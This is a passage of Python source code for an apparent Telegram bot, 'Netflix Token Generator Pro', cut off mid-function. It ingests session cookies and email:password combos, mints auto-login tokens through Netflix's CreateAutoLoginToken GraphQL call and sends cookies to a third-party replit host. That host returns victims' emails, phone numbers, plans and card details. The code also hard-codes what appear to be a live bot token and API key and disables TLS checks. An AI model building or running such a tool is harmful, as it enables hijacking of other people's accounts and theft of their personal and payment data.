#!/usr/bin/env python3
"""
Netflix Token Generator Pro - Complete Version
Uses custom API for account details.
"""

import logging
import requests
import json
import re
import zipfile
import io
import concurrent.futures
import threading
import time
import traceback
import sys
import os
import hashlib
import base64
import urllib.parse
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional, Any, Union, Set
from dataclasses import dataclass, field, asdict
from collections import defaultdict
from enum import Enum
from pathlib import Path
from functools import wraps
from queue import Queue
import random
import string
import asyncio
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Third party imports with error handling
try:
    import pytz
    from pytz import UTC
    PYTZ_AVAILABLE = True
except ImportError:
    PYTZ_AVAILABLE = False
    print("⚠️ pytz not installed. Run: pip install pytz")

try:
    import pycountry
    PYCOUNTRY_AVAILABLE = True
except ImportError:
    PYCOUNTRY_AVAILABLE = False
    print("⚠️ pycountry not installed. Run: pip install pycountry")

try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
    from telegram.constants import ParseMode
    from telegram.error import TelegramError, RetryAfter, TimedOut
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("⚠️ Telegram modules not available. Run: pip install python-telegram-bot")

# ==================== CONFIGURATION ====================
TOKEN = "8975657408:AAHBLQ07BJMNb4h2GDc9oWWNbMPMRwMYULU"  # Replace with your bot token
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB limit
MAX_THREADS = 10
BOT_VERSION = "2.1.0"
BOT_RELEASE_DATE = "2025-02-21"
REQUEST_TIMEOUT = 30
MAX_RETRIES = 3
CACHE_SIZE = 1000
ENABLE_ANALYTICS = True
DEBUG_MODE = False

# ==================== CUSTOM API CONFIGURATION ====================
API_BASE = "https://ghost-gen-nf--kumary123411.replit.app"
API_KEY = "nf-ABD8WBI-Ckd8ohTJ95FrOS5IQzS5nHCSKw0EjPmostg"
API_INFO_ENDPOINT = "/api/convert"

# ==================== ENUMS ====================
class SubscriptionTier(Enum):
    UNKNOWN = "unknown"
    BASIC = "basic"
    STANDARD = "standard"
    PREMIUM = "premium"
    PREMIUM_4K = "premium_4k"
    AD_SUPPORTED = "ad_supported"

class AccountStatus(Enum):
    ACTIVE = "active"
    ON_HOLD = "on_hold"
    SUSPENDED = "suspended"
    CANCELLED = "cancelled"
    TRIAL = "trial"
    EXPIRED = "expired"

class PaymentMethod(Enum):
    CREDIT_CARD = "credit_card"
    DEBIT_CARD = "debit_card"
    PAYPAL = "paypal"
    GIFT_CARD = "gift_card"
    UNKNOWN = "unknown"

class InputFormat(Enum):
    NETSCAPE = "netscape"
    JSON = "json"
    HEADER = "header"
    RAW = "raw"
    EMAIL_PASS = "email_pass"
    UNKNOWN = "unknown"

# ==================== DATA CLASSES ====================
@dataclass
class AccountDetails:
    # Basic Info
    email: Optional[str] = None
    profile_name: Optional[str] = None
    country: Optional[str] = None

    # Subscription Details
    subscription_tier: SubscriptionTier = SubscriptionTier.UNKNOWN
    plan_type: Optional[str] = None
    plan_price: Optional[str] = None
    currency: Optional[str] = None

    # Dates
    member_since: Optional[datetime] = None
    next_billing: Optional[datetime] = None
    trial_end: Optional[datetime] = None

    # Status
    status: AccountStatus = AccountStatus.ACTIVE
    is_active: bool = True
    on_hold: bool = False
    email_verified: bool = False

    # Profiles
    profile_count: int = 0
    profile_names: List[str] = field(default_factory=list)
    primary_profile: Optional[str] = None

    # Payment
    payment_method: Optional[str] = None
    card_type: Optional[str] = None
    card_last4: Optional[str] = None
    card_expiry: Optional[str] = None

    # Contact
    phone: Optional[str] = None
    phone_verified: bool = False
    alternate_email: Optional[str] = None

    # Features
    has_extra_member: bool = False
    extra_member_slots: int = 0
    profiles_remaining: int = 0
    download_allowed: bool = True
    ultra_hd_allowed: bool = False

    # Streaming Limits
    max_streams: int = 1
    quality: str = "HD"

    # Security
    two_factor_enabled: bool = False
    last_login: Optional[datetime] = None
    login_ip: Optional[str] = None
    device_count: int = 0

    def to_dict(self) -> Dict[str, Any]:
        data = asdict(self)
        if isinstance(self.subscription_tier, Enum):
            data['subscription_tier'] = self.subscription_tier.value
        if isinstance(self.status, Enum):
            data['status'] = self.status.value
        for key in ['member_since', 'next_billing', 'trial_end', 'last_login']:
            if data.get(key) and isinstance(data[key], datetime):
                data[key] = data[key].isoformat()
        return data

@dataclass
class CheckResult:
    success: bool = False
    token: Optional[str] = None
    login_url: Optional[str] = None
    expires: Optional[str] = None
    account_details: Optional[AccountDetails] = None
    error: Optional[str] = None
    error_code: Optional[str] = None
    source_file: Optional[str] = None
    source_line: Optional[int] = None
    cookies_used: Dict[str, str] = field(default_factory=dict)
    processing_time: float = 0.0
    format_type: str = "unknown"
    timestamp: datetime = field(default_factory=datetime.now)
    request_id: Optional[str] = None
    retry_count: int = 0
    cached: bool = False

    def to_dict(self) -> Dict[str, Any]:
        data = asdict(self)
        if self.account_details:
            data['account_details'] = self.account_details.to_dict()
        if isinstance(self.timestamp, datetime):
            data['timestamp'] = self.timestamp.isoformat()
        return data

@dataclass
class BatchResult:
    total: int = 0
    success: int = 0
    failed: int = 0
    premium: int = 0
    standard: int = 0
    basic: int = 0
    unknown: int = 0
    total_time: float = 0.0
    avg_time: float = 0.0
    results: List[CheckResult] = field(default_factory=list)
    start_time: datetime = field(default_factory=datetime.now)
    end_time: Optional[datetime] = None
    file_name: Optional[str] = None

    def calculate_stats(self):
        self.end_time = datetime.now()
        self.total = len(self.results)
        self.success = sum(1 for r in self.results if r.success)
        self.failed = self.total - self.success
        for r in self.results:
            if r.account_details:
                tier = r.account_details.subscription_tier
                if tier == SubscriptionTier.PREMIUM or tier == SubscriptionTier.PREMIUM_4K:
                    self.premium += 1
                elif tier == SubscriptionTier.STANDARD:
                    self.standard += 1
                elif tier == SubscriptionTier.BASIC:
                    self.basic += 1
                else:
                    self.unknown += 1
        if self.results:
            self.avg_time = sum(r.processing_time for r in self.results) / len(self.results)

# ==================== UTILITY CLASSES ====================
class CountryFlagMapper:
    _flag_cache: Dict[str, str] = {}
    _name_cache: Dict[str, str] = {}

    @classmethod
    def get_flag(cls, country_code: str) -> str:
        if not country_code or len(country_code) != 2:
            return "🌍"
        if country_code in cls._flag_cache:
            return cls._flag_cache[country_code]
        try:
            flag = chr(ord(country_code[0]) + 127397) + chr(ord(country_code[1]) + 127397)
            cls._flag_cache[country_code] = flag
            return flag
        except:
            return "🌍"

    @classmethod
    def get_country_name(cls, country_code: str) -> str:
        if not country_code or len(country_code) != 2:
            return "Unknown"
        if country_code in cls._name_cache:
            return cls._name_cache[country_code]
        if PYCOUNTRY_AVAILABLE:
            try:
                country = pycountry.countries.get(alpha_2=country_code.upper())
                if country:
                    name = country.name
                    cls._name_cache[country_code] = name
                    return name
            except:
                pass
        common_names = {
            'US': 'United States', 'GB': 'United Kingdom', 'IN': 'India',
            'CA': 'Canada', 'AU': 'Australia', 'DE': 'Germany', 'FR': 'France',
            'JP': 'Japan', 'BR': 'Brazil', 'MX': 'Mexico', 'ES': 'Spain',
            'IT': 'Italy', 'NL': 'Netherlands', 'SE': 'Sweden', 'NO': 'Norway',
            'DK': 'Denmark', 'FI': 'Finland', 'PL': 'Poland', 'TR': 'Turkey',
            'PH': 'Philippines', 'AE': 'United Arab Emirates'
        }
        name = common_names.get(country_code.upper(), "Unknown")
        cls._name_cache[country_code] = name
        return name

class TokenExpiryCalculator:
    @staticmethod
    def calculate_expiry(generated_time: Optional[datetime] = None,
                        validity_hours: int = 1) -> Dict[str, str]:
        if generated_time is None:
            now = datetime.now(UTC) if PYTZ_AVAILABLE else datetime.now()
        else:
            now = generated_time
        expires_time = now + timedelta(hours=validity_hours)
        current_time = datetime.now(UTC) if PYTZ_AVAILABLE else datetime.now()
        remaining = expires_time - current_time
        if remaining.total_seconds() <= 0:
            remaining_str = "Expired"
        else:
            days = remaining.days
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds // 60) % 60
            seconds = remaining.seconds % 60
            parts = []
            if days > 0:
                parts.append(f"{days}d")
            if hours > 0:
                parts.append(f"{hours}h")
            if minutes > 0:
                parts.append(f"{minutes}m")
            if seconds > 0 and not parts:
                parts.append(f"{seconds}s")
            remaining_str = " ".join(parts) if parts else "Expiring soon"
        time_format = "%Y-%m-%d %H:%M:%S"
        if PYTZ_AVAILABLE:
            local_tz = pytz.timezone('Asia/Kolkata')
            generated_local = now.astimezone(local_tz)
            expires_local = expires_time.astimezone(local_tz)
            generated_str = generated_local.strftime(time_format)
            expires_str = expires_local.strftime(time_format)
        else:
            generated_str = now.strftime(time_format)
            expires_str = expires_time.strftime(time_format)
        return {
            "generated": generated_str,
            "expires": expires_str,
            "remaining": remaining_str,
            "expired": remaining.total_seconds() <= 0
        }

class RequestIDGenerator:
    @staticmethod
    def generate(prefix: str = "REQ") -> str:
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        return f"{prefix}-{timestamp}-{random_part}"

class CacheManager:
    def __init__(self, max_size: int = CACHE_SIZE, default_ttl: int = 3600):
        self.cache: Dict[str, Tuple[Any, float]] = {}
        self.max_size = max_size
        self.default_ttl = default_ttl
        self.lock = threading.RLock()

    def get(self, key: str) -> Optional[Any]:
        with self.lock:
            if key in self.cache:
                value, expiry = self.cache[key]
                if expiry > time.time():
                    return value
                else:
                    del self.cache[key]
            return None

    def set(self, key: str, value: Any, ttl: Optional[int] = None):
        with self.lock:
            if len(self.cache) >= self.max_size:
                oldest_key = next(iter(self.cache))
                del self.cache[oldest_key]
            expiry = time.time() + (ttl or self.default_ttl)
            self.cache[key] = (value, expiry)

    def clear(self):
        with self.lock:
            self.cache.clear()

    def remove(self, key: str):
        with self.lock:
            if key in self.cache:
                del self.cache[key]

# ==================== STATISTICS TRACKING ====================
class BotStats:
    def __init__(self):
        self.lock = threading.RLock()
        self.total_users: Set[int] = set()
        self.total_checks: int = 0
        self.successful_checks: int = 0
        self.premium_accounts_found: int = 0
        self.start_time: datetime = datetime.now()
        self.daily_checks: Dict[str, int] = defaultdict(int)
        self.format_usage: Dict[str, int] = defaultdict(int)
        self.hourly_requests: List[int] = [0] * 24
        self.errors: Dict[str, int] = defaultdict(int)
        self.response_times: List[float] = []
        self.daily_active_users: Set[int] = set()
        self.total_files_processed: int = 0
        self.total_batches: int = 0
        self.peak_concurrent: int = 0
        self.current_concurrent: int = 0
        self.total_processing_time: float = 0.0

    def add_user(self, user_id: int):
        with self.lock:
            self.total_users.add(user_id)
            self.daily_active_users.add(user_id)

    def record_check(self, success: bool, is_premium: bool = False,
                    format_type: str = "unknown", error_type: Optional[str] = None,
                    processing_time: float = 0.0):
        with self.lock:
            self.total_checks += 1
            if success:
                self.successful_checks += 1
            if is_premium:
                self.premium_accounts_found += 1
            date_key = datetime.now().strftime("%Y-%m-%d")
            self.daily_checks[date_key] += 1
            self.format_usage[format_type] += 1
            hour = datetime.now().hour
            self.hourly_requests[hour] += 1
            if error_type:
                self.errors[error_type] += 1
            if processing_time > 0:
                self.response_times.append(processing_time)
                if len(self.response_times) > 1000:
                    self.response_times = self.response_times[-1000:]
            self.total_processing_time += processing_time

    def record_file_processed(self):
        with self.lock:
            self.total_files_processed += 1

    def record_batch(self, count: int):
        with self.lock:
            self.total_batches += 1

    def update_concurrent(self, delta: int):
        with self.lock:
            self.current_concurrent += delta
            if self.current_concurrent > self.peak_concurrent:
                self.peak_concurrent = self.current_concurrent

    def get_success_rate(self) -> float:
        if self.total_checks == 0:
            return 0.0
        return (self.successful_checks / self.total_checks) * 100

    def get_avg_response_time(self) -> float:
        if not self.response_times:
            return 0.0
        return sum(self.response_times) / len(self.response_times)

    def get_uptime(self) -> str:
        uptime = datetime.now() - self.start_time
        days = uptime.days
        hours = uptime.seconds // 3600
        minutes = (uptime.seconds // 60) % 60
        seconds = uptime.seconds % 60
        parts = []
        if days > 0:
            parts.append(f"{days}d")
        if hours > 0:
            parts.append(f"{hours}h")
        if minutes > 0:
            parts.append(f"{minutes}m")
        if seconds > 0 or not parts:
            parts.append(f"{seconds}s")
        return " ".join(parts)

    def get_stats_summary(self) -> Dict[str, Any]:
        with self.lock:
            now = datetime.now()
            today = now.strftime("%Y-%m-%d")
            active_today = len([uid for uid in self.daily_active_users if uid in self.total_users])
            top_errors = dict(sorted(self.errors.items(), key=lambda x: x[1], reverse=True)[:5])
            format_breakdown = dict(sorted(self.format_usage.items(), key=lambda x: x[1], reverse=True))
            hourly = {f"{i:02d}:00": self.hourly_requests[i] for i in range(24) if self.hourly_requests[i] > 0}
            return {
                "total_users": len(self.total_users),
                "active_today": active_today,
                "total_checks": self.total_checks,
                "successful_checks": self.successful_checks,
                "success_rate": self.get_success_rate(),
                "premium_accounts": self.premium_accounts_found,
                "uptime": self.get_uptime(),
                "start_time": self.start_time.strftime("%Y-%m-%d %H:%M:%S"),
                "checks_today": self.daily_checks.get(today, 0),
                "format_breakdown": format_breakdown,
                "error_breakdown": top_errors,
                "avg_response_time": self.get_avg_response_time(),
                "peak_concurrent": self.peak_concurrent,
                "total_files": self.total_files_processed,
                "total_batches": self.total_batches,
                "total_processing_time": f"{self.total_processing_time:.2f}s",
                "hourly_distribution": hourly,
                "cache_hit_rate": "N/A"
            }

# ==================== CORE PROCESSOR ====================
class NetflixTokenGenerator:
    def __init__(self):
        self.session = self._create_session()
        self.headers = self._get_default_headers()
        self.api_url = 'https://android13.prod.ftl.netflix.com/graphql'
        self.cache = CacheManager()
        self.stats_lock = threading.RLock()
        self.total_processed = 0
        self.cache_hits = 0
        self.cache_misses = 0

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        retry_strategy = requests.adapters.Retry(
            total=MAX_RETRIES,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
        )
        adapter = requests.adapters.HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=100,
            pool_maxsize=100
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def _get_default_headers(self) -> Dict[str, str]:
        user_agents = [
            'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
            'com.netflix.mediaclient/64032 (Linux; U; Android 14; Pixel 7; Build/UP1A.231105.001; Cronet/144.0.7465.0)',
            'com.netflix.mediaclient/64150 (Linux; U; Android 14; SM-S918B; Build/UP1A.231105.001; Cronet/145.0.7482.0)',
            'com.netflix.mediaclient/64280 (Linux; U; Android 14; iPhone15,3; Build/21A329; Cronet/146.0.7498.0)'
        ]
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://www.netflix.com',
            'Referer': 'https://www.netflix.com/',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache'
        }

    def _rotate_headers(self):
        self.headers['User-Agent'] = self._get_default_headers()['User-Agent']

    # ========== PARSING ENGINE ==========
    def parse_netscape_cookie_line(self, line: str) -> Dict[str, str]:
        parts = line.strip().split('\t')
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            return {name: value}
        return {}

    def parse_netscape_cookies(self, content: str) -> List[Dict[str, str]]:
        cookies_list = []
        current_cookie_set = {}
        lines = content.split('\n')
        line_number = 0
        for line in lines:
            line_number += 1
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            cookie = self.parse_netscape_cookie_line(line)
            if cookie:
                current_cookie_set.update(cookie)
                if 'NetflixId' in current_cookie_set and 'SecureNetflixId' in current_cookie_set:
                    current_cookie_set['_source_line'] = line_number
                    cookies_list.append(current_cookie_set.copy())
                    current_cookie_set = {}
        return cookies_list

    def parse_header_string(self, text: str) -> Dict[str, str]:
        cookies = {}
        patterns = [
            r'Cookie:\s*([^=]+=[^;]+(?:;\s*[^=]+=[^;]+)*)',
            r'(NetflixId=[^;\s]+)',
            r'(SecureNetflixId=[^;\s]+)',
            r'(nfvdid=[^;\s]+)',
            r'(OptanonConsent=[^;\s]+)'
        ]
        for pattern in patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                if '=' in match:
                    if ';' in match:
                        for cookie_part in match.split(';'):
                            if '=' in cookie_part:
                                key, value = cookie_part.split('=', 1)
                                cookies[key.strip()] = value.strip()
                    else:
                        key, value = match.split('=', 1)
                        cookies[key.strip()] = value.split(';')[0].strip()
        return cookies

    def parse_json_format(self, data: Any) -> List[Dict[str, str]]:
        results = []
        if isinstance(data, dict):
            cookie_dict = {}
            for key in ['NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent', 'email', 'password']:
                if key in data:
                    cookie_dict[key] = str(data[key])
            if 'NetflixId' in cookie_dict and 'SecureNetflixId' in cookie_dict:
                results.append(cookie_dict)
        elif isinstance(data, list):
            for item in data:
                if isinstance(item, dict):
                    cookie_dict = {}
                    for key in ['NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent', 'email', 'password']:
                        if key in item:
                            cookie_dict[key] = str(item[key])
                    if 'NetflixId' in cookie_dict and 'SecureNetflixId' in cookie_dict:
                        results.append(cookie_dict)
        return results

    def parse_email_pass(self, line: str) -> Optional[Dict[str, str]]:
        for separator in [':', '|', ';', ',']:
            if separator in line and '@' in line:
                parts = line.strip().split(separator, 1)
                if len(parts) == 2:
                    email = parts[0].strip()
                    password = parts[1].strip()
                    if re.match(r'[^@]+@[^@]+\.[^@]+', email):
                        return {'email': email, 'password': password}
        return None

    def parse_url_encoded_format(self, text: str) -> List[Dict[str, str]]:
        results = []
        text = text.strip()
        if '%' not in text or 'NetflixId' not in text:
            return results
        try:
            cookie_dict = {}
            # Extract each cookie key's raw (URL-encoded) value so the cookie
            # string stays intact when passed to the API.
            for key in ['NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent']:
                # Match key= followed by value that ends at an unencoded & or whitespace
                pattern = rf'(?:^|[;&\s]){re.escape(key)}=([^\s;]+)'
                match = re.search(pattern, text)
                if match:
                    cookie_dict[key] = match.group(1)
            # NetflixId alone is sufficient — SecureNetflixId is optional for the API
            if cookie_dict.get('NetflixId'):
                results.append(cookie_dict)
        except Exception:
            pass
        return results

    def extract_all_formats(self, text: str) -> List[Dict[str, str]]:
        results = []
        seen_hashes = set()
        # URL-encoded
        if not results and '%' in text:
            url_results = self.parse_url_encoded_format(text)
            for r in url_results:
                r['_format'] = 'url_encoded'
                cookie_hash = hashlib.md5(str(sorted([(k,v) for k,v in r.items() if not k.startswith('_')])).encode()).hexdigest()
                if cookie_hash not in seen_hashes:
                    seen_hashes.add(cookie_hash)
                    results.append(r)
        # JSON
        if not results:
            try:
                data = json.loads(text)
                json_results = self.parse_json_format(data)
                if json_results:
                    for r in json_results:
                        r['_format'] = 'json'
                        cookie_hash = hashlib.md5(str(sorted(r.items())).encode()).hexdigest()
                        if cookie_hash not in seen_hashes:
                            seen_hashes.add(cookie_hash)
                            results.append(r)
            except:
                pass
        # Netscape
        if not results and '\t' in text:
            netscape_results = self.parse_netscape_cookies(text)
            if netscape_results:
                for r in netscape_results:
                    r['_format'] = 'netscape'
                    cookie_hash = hashlib.md5(str(sorted([(k,v) for k,v in r.items() if not k.startswith('_')])).encode()).hexdigest()
                    if cookie_hash not in seen_hashes:
                        seen_hashes.add(cookie_hash)
                        results.append(r)
        # Header
        if not results:
            header_cookies = self.parse_header_string(text)
            if header_cookies.get('NetflixId') and header_cookies.get('SecureNetflixId'):
                header_cookies['_format'] = 'header'
                cookie_hash = hashlib.md5(str(sorted(header_cookies.items())).encode()).hexdigest()
                if cookie_hash not in seen_hashes:
                    seen_hashes.add(cookie_hash)
                    results.append(header_cookies)
        # Email:pass
        if not results and ':' in text and '@' in text:
            for line in text.split('\n'):
                email_pass = self.parse_email_pass(line)
                if email_pass:
                    email_pass['_format'] = 'email_pass'
                    email_pass['_needs_login'] = True
                    cookie_hash = hashlib.md5(str(sorted(email_pass.items())).encode()).hexdigest()
                    if cookie_hash not in seen_hashes:
                        seen_hashes.add(cookie_hash)
                        results.append(email_pass)
        # Raw
        if not results:
            raw_cookies = {}
            patterns = [
                r'(NetflixId=[^;\s]+)',
                r'(SecureNetflixId=[^;\s]+)',
                r'(nfvdid=[^;\s]+)',
                r'(OptanonConsent=[^;\s]+)'
            ]
            for pattern in patterns:
                matches = re.findall(pattern, text)
                for match in matches:
                    if '=' in match:
                        key, value = match.split('=', 1)
                        raw_cookies[key] = value
            if raw_cookies.get('NetflixId') and raw_cookies.get('SecureNetflixId'):
                raw_cookies['_format'] = 'raw'
                cookie_hash = hashlib.md5(str(sorted(raw_cookies.items())).encode()).hexdigest()
                if cookie_hash not in seen_hashes:
                    seen_hashes.add(cookie_hash)
                    results.append(raw_cookies)
        return results

    def build_cookie_string(self, cookie_dict: Dict[str, str]) -> str:
        return '; '.join([f"{k}={v}" for k, v in cookie_dict.items() if not k.startswith('_')])

    # ========== DETAILS FETCHING ==========
    def fetch_account_details(self, cookie_dict: Dict[str, str], source_file: str = "") -> AccountDetails:
        details = AccountDetails()
        details.is_active = True

        try:
            cache_key = f"account_{hashlib.md5(str(sorted(cookie_dict.items())).encode()).hexdigest()}"
            cached = self.cache.get(cache_key)
            if cached:
                with self.stats_lock:
                    self.cache_hits += 1
                return cached

            with self.stats_lock:
                self.cache_misses += 1

            cookie_str = self.build_cookie_string(cookie_dict)

            # Fetch from custom API
            self._fetch_from_custom_api(cookie_str, details)

            # Fallback: extract from filename
            self._extract_from_filename(source_file, details)

            if not details.plan_type and not details.profile_name and not details.country and not details.email:
                details.is_active = False

            self.cache.set(cache_key, details, ttl=300)
            return details

        except Exception as e:
            logging.error(f"Unexpected error in fetch_account_details: {e}")
            logging.debug(traceback.format_exc())
            details.is_active = False
            return details

    def _fetch_from_custom_api(self, cookie_str: str, details: AccountDetails):
        try:
            netflix_id = None
            secure_netflix_id = None

            for part in cookie_str.split("; "):
                if "=" in part:
                    key, val = part.split("=", 1)
                    if key == "NetflixId":
                        netflix_id = val
                    elif key == "SecureNetflixId":
                        secure_netflix_id = val

            if not netflix_id:
                logging.warning("NetflixId not found in cookie string")
                return

            url = f"{API_BASE}{API_INFO_ENDPOINT}"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "Content-Type": "application/json",
                "X-API-Key": API_KEY,
            }

            payload = {"api_key": API_KEY, "netflix_id": netflix_id}
            if secure_netflix_id:
                payload["secure_netflix_id"] = secure_netflix_id

            response = self.session.post(
                url, headers=headers, json=payload, timeout=REQUEST_TIMEOUT, verify=False
            )

            if response.status_code == 200:
                data = response.json()

                if data.get("name"):
                    details.profile_name = data["name"]
                if data.get("email"):
                    details.email = data["email"]
                if data.get("country"):
                    details.country = data["country"]
                if data.get("phone"):
                    details.phone = data["phone"]
                if data.get("emailVerified") is not None:
                    details.email_verified = data["emailVerified"]
                if data.get("memberSince"):
                    try:
                        details.member_since = datetime.fromisoformat(
                            data["memberSince"].replace("Z", "+00:00")
                        )
                    except Exception:
                        pass

                if data.get("plan"):
                    details.plan_type = data["plan"]
                    p = details.plan_type.lower()
                    if "premium" in p:
                        details.subscription_tier = SubscriptionTier.PREMIUM
                    elif "standard" in p:
                        details.subscription_tier = SubscriptionTier.STANDARD
                    elif "basic" in p:
                        details.subscription_tier = SubscriptionTier.BASIC

                if data.get("price"):
                    details.plan_price = str(data["price"])

                if data.get("nextBilling"):
                    try:
                        details.next_billing = datetime.fromisoformat(
                            data["nextBilling"].replace("Z", "+00:00")
                        )
                    except Exception:
                        pass

                if data.get("membershipStatus"):
                    try:
                        details.status = AccountStatus(data["membershipStatus"].lower())
                    except Exception:
                        pass

                if data.get("quality"):
                    details.quality = data["quality"]
                if data.get("streams"):
                    details.max_streams = data["streams"]
                if data.get("extraMember") is not None:
                    details.has_extra_member = data["extraMember"]

                if data.get("paymentMethod"):
                    details.payment_method = data["paymentMethod"]
                if data.get("cardType"):
                    details.card_type = data["cardType"]
                if data.get("cardLast4"):
                    details.card_last4 = data["cardLast4"]

                if isinstance(data.get("profiles"), list):
                    details.profile_count = len(data["profiles"])
                    details.profile_names = [
                        p.get("name") for p in data["profiles"] if p.get("name")
                    ]

                if isinstance(data.get("connectedProfiles"), list):
                    details.has_extra_member = True
                    details.extra_member_slots = len(data["connectedProfiles"])

            else:
                logging.warning(
                    f"Custom API returned {response.status_code}: {response.text[:200]}"
                )

        except Exception as e:
            logging.error(f"Error calling custom API: {e}")

    def _extract_from_filename(self, source_file: str, details: AccountDetails):
        if not source_file:
            return
        import re
        email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', source_file)
        if email_match and not details.email:
            details.email = email_match.group(1)
        country_match = re.search(r'\[([A-Z]{2})\]', source_file)
        if country_match and not details.country:
            details.country = country_match.group(1)
        plan_match = re.search(r'\[(Premium|Standard|Basic)\]', source_file, re.IGNORECASE)
        if plan_match and not details.plan_type:
            details.plan_type = plan_match.group(1).capitalize()
            if 'premium' in details.plan_type.lower():
                details.subscription_tier = SubscriptionTier.PREMIUM
            elif 'standard' in details.plan_type.lower():
                details.subscription_tier = SubscriptionTier.STANDARD
            elif 'basic' in details.plan_type.lower():
                details.subscription_tier = SubscriptionTier.BASIC

    # ========== CUSTOM API TOKEN GENERATION (NetflixId-only format) ==========
    def _generate_token_via_custom_api(self, cookie_dict: Dict[str, str], request_id: str) -> Tuple[bool, Optional[str], Optional[AccountDetails], Optional[str]]:
        try:
            cookie_str = self.build_cookie_string(cookie_dict)
            req_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json",
                "Content-Type": "application/json",
            }

            # --- Attempt 1: paid endpoint with API key ---
            paid_resp = self.session.post(
                f"{API_BASE}/api/convert",
                headers=req_headers,
                json={"api_key": API_KEY, "cookie": cookie_str},
                timeout=REQUEST_TIMEOUT,
                verify=False,
            )
            if paid_resp.status_code == 200:
                data = paid_resp.json()
                if data.get("success"):
                    return self._parse_convert_response(data, cookie_dict)
                return False, None, None, data.get("error", "API error"), None

            # --- Attempt 2: free /test endpoint (no key required) ---
            free_resp = self.session.post(
                f"{API_BASE}/test",
                headers=req_headers,
                json={"cookie": cookie_str},
                timeout=REQUEST_TIMEOUT,
                verify=False,
            )
            if free_resp.status_code == 200:
                data = free_resp.json()
                login_url = data.get("login_url", "")
                if login_url:
                    return self._parse_convert_response(data, cookie_dict)
                return False, None, None, data.get("error", "No login_url in response"), None

            return False, None, None, f"API HTTP {free_resp.status_code}: {(free_resp.text or '')[:200]}", None

        except requests.exceptions.Timeout:
            return False, None, None, f"API timeout after {REQUEST_TIMEOUT}s", None
        except requests.exceptions.ConnectionError:
            return False, None, None, "API connection error", None
        except Exception as e:
            return False, None, None, f"API error: {e}", None

    def _parse_convert_response(self, data: dict, cookie_dict: Dict[str, str]) -> Tuple[bool, Optional[str], Optional[AccountDetails], Optional[str], Optional[str]]:
        # Return the raw token value (not the full URL) so the formatter can
        # build proper mobile/PC links from it.
        raw_token = data.get("token", "") or data.get("login_url", "")
        # If we only got a full URL, extract the nftoken parameter from it
        if raw_token.startswith("http") and "nftoken=" in raw_token:
            raw_token = raw_token.split("nftoken=", 1)[1]
        expires = data.get("expires", "")
        try:
            source_file = cookie_dict.get('_source', '')
            account_details = self.fetch_account_details(cookie_dict, source_file=source_file)
        except Exception:
            account_details = AccountDetails(is_active=True)
        return True, raw_token, account_details, None, expires

    # ========== TOKEN GENERATION ==========
    def generate_token(self, cookie_dict: Dict[str, str]) -> Tuple[bool, Optional[str], Optional[AccountDetails], Optional[str]]:
        start_time = time.time()
        request_id = RequestIDGenerator.generate("TOK")

        try:
            if "NetflixId" not in cookie_dict:
                return False, None, None, "Missing NetflixId cookie", None

            has_secure = "SecureNetflixId" in cookie_dict

            # If we only have NetflixId (URL-encoded format), use the custom API
            # to generate the token instead of Netflix's GraphQL endpoint.
            if not has_secure:
                return self._generate_token_via_custom_api(cookie_dict, request_id)

            cookie_str = self.build_cookie_string(cookie_dict)
            self._rotate_headers()

            token_payload = {
                "operationName": "CreateAutoLoginToken",
                "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
                "extensions": {
                    "persistedQuery": {
                        "version": 102,
                        "id": "76e97129-f4b5-41a0-a73c-12e674896849",
                    }
                },
            }

            headers = self.headers.copy()
            headers["Cookie"] = cookie_str
            headers["X-Netflix.RequestIdentifier"] = request_id

            response = self.session.post(
                self.api_url,
                headers=headers,
                json=token_payload,
                timeout=REQUEST_TIMEOUT,
            )

            if response.status_code == 200:
                data = response.json()

                if data.get("data") and "createAutoLoginToken" in data["data"]:
                    token = data["data"]["createAutoLoginToken"]

                    try:
                        source_file = cookie_dict.get('_source', '')
                        account_details = self.fetch_account_details(cookie_dict, source_file=source_file)
                    except Exception:
                        account_details = AccountDetails(is_active=False)

                    return True, token, account_details, None, None

                if "errors" in data and data["errors"]:
                    error_msg = data["errors"][0].get("message", "Unknown API error")
                    if "AccessDeniedException" in error_msg or "SBD" in error_msg:
                        return False, None, None, "Access denied, cookie invalid or expired", None
                    return False, None, None, f"API Error: {error_msg}", None

